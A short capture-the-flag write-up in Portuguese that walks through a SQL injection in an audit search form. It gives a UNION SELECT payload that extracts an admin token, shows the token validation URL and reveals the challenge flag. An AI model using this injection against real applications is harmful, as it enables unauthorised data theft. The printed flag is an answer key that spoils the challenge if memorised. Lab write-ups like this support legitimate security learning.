# Writeup — Relatório Vazado

## Vulnerabilidade
SQL Injection via LIKE não parametrizado + UNION SELECT.

## Passo a passo
1. Use o formulário para gerar `/auditoria/search?campo=...`
2. Teste com `'` e veja mudanças no HTML.
3. Tente UNION com 2 colunas:

```
' UNION SELECT token_admin, 0 FROM transacoes --
```

4. Obtenha o token administrativo.
5. Valide-o em:

```
/auditoria/validar?token=TOKEN
```

6. Flag: `CTF{vazamento_natalino_sql}`
